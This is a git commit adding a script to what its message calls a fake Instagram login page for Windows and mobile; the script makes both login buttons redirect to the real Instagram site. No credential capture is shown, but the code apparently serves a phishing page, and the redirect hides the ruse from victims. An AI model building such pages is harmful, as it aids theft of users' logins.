ac628d6f5f844d4fc7baae3bdf5542a803e1a3a3
Jaswanth Kumar <jaswanthkumarkamireddi@gmail.com>
2026-03-01 15:46:41 +0530

    Added Windows and Mobile Version Insta Fake Page

---
+++ Pages/Instagram/instagram.js
@@ -0,0 +1,12 @@
+const mobile_button = document.getElementById("login-btn");
+const window_button = document.getElementById("window-login-btn");
+
+mobile_button.addEventListener("click",(event)=>{
+    event.preventDefault();
+    location.href = "https://www.instagram.com/";
+})
+
+window_button.addEventListener("click",(event)=>{
+    event.preventDefault();
+    location.href = "https://www.instagram.com/";
+})
